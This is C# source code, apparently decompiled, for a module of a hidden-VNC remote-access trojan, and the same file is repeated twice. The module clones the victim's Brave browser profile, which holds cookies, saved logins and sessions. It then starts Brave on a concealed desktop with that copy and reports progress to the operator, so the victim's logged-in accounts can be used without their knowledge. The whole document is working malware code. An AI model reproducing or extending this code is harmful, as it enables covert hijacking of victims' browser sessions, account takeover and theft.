#define DEBUG
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using DLL.S.OpenApp;
using HVNC;
using Microsoft.VisualBasic.Devices;

namespace S.OpenApp;

internal class Brave
{
	private static readonly Computer PC = new Computer();

	private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data";

	private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\Brave Data";

	private static readonly string FilenameBrave = WDir.SystemDirectory + "Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";

	private static readonly string FilenameBravex86 = WDir.SystemDirectory + "Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";

	public static void OpenBraveBrowser()
	{
		HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
		try
		{
			if (!File.Exists(FilenameBrave) && !File.Exists(FilenameBravex86))
			{
				HVNC.Plugin.Helper.SendMSG("Brave: Not Installed!");
				return;
			}
			try
			{
				if (!Directory.Exists(fileNameUserDataCopy))
				{
					HVNC.Plugin.Helper.SendMSG("Brave: CloneProfile..");
					PC.FileSystem.CopyDirectory(fileNameUserData, fileNameUserDataCopy);
					HVNC.Plugin.Helper.SendMSG("Brave: CloneProfile Completed");
				}
			}
			catch
			{
				Debug.WriteLine("Error!");
			}
			Debug.WriteLine("Complete.///");
			new Thread((ThreadStart)delegate
			{
				Thread.Sleep(1000);
				HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
				Open();
			}).Start();
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("Brave: " + ex.Message);
		}
	}

	public static void Open()
	{
		try
		{
			string text = null;
			if (File.Exists(FilenameBrave))
			{
				text = FilenameBrave;
			}
			if (File.Exists(FilenameBravex86))
			{
				text = FilenameBravex86;
			}
			if (text != null)
			{
				HideDesktop.CreateProcess("\"" + text + "\" --disable-3d-apis --disable-gpu --disable-d3d11 \"--user-data-dir=" + fileNameUserDataCopy + "\"", HVNC.Plugin.Helper.NameDesktop, bAppName: false);
				Debug.WriteLine("Running.////");
				HVNC.Plugin.Helper.SendMSG("Brave: Running");
				Thread.Sleep(3000);
				HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
				Debug.WriteLine("Refresh");
			}
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("Brave: " + ex.Message);
		}
	}
}
#define DEBUG
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using DLL.S.OpenApp;
using HVNC;
using Microsoft.VisualBasic.Devices;

namespace S.OpenApp;

internal class Brave
{
	private static readonly Computer PC = new Computer();

	private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data";

	private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\Brave Data";

	private static readonly string FilenameBrave = WDir.SystemDirectory + "Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";

	private static readonly string FilenameBravex86 = WDir.SystemDirectory + "Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";

	public static void OpenBraveBrowser()
	{
		HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
		try
		{
			if (!File.Exists(FilenameBrave) && !File.Exists(FilenameBravex86))
			{
				HVNC.Plugin.Helper.SendMSG("Brave: Not Installed!");
				return;
			}
			try
			{
				if (!Directory.Exists(fileNameUserDataCopy))
				{
					HVNC.Plugin.Helper.SendMSG("Brave: CloneProfile..");
					PC.FileSystem.CopyDirectory(fileNameUserData, fileNameUserDataCopy);
					HVNC.Plugin.Helper.SendMSG("Brave: CloneProfile Completed");
				}
			}
			catch
			{
				Debug.WriteLine("Error!");
			}
			Debug.WriteLine("Complete.///");
			new Thread((ThreadStart)delegate
			{
				Thread.Sleep(1000);
				HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
				Open();
			}).Start();
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("Brave: " + ex.Message);
		}
	}

	public static void Open()
	{
		try
		{
			string text = null;
			if (File.Exists(FilenameBrave))
			{
				text = FilenameBrave;
			}
			if (File.Exists(FilenameBravex86))
			{
				text = FilenameBravex86;
			}
			if (text != null)
			{
				HideDesktop.CreateProcess("\"" + text + "\" --disable-3d-apis --disable-gpu --disable-d3d11 \"--user-data-dir=" + fileNameUserDataCopy + "\"", HVNC.Plugin.Helper.NameDesktop, bAppName: false);
				Debug.WriteLine("Running.////");
				HVNC.Plugin.Helper.SendMSG("Brave: Running");
				Thread.Sleep(3000);
				HideDesktop.Load(HVNC.Plugin.Helper.HVNCDesktop);
				Debug.WriteLine("Refresh");
			}
		}
		catch (Exception ex)
		{
			HVNC.Plugin.Helper.SendMSG("Brave: " + ex.Message);
		}
	}
}
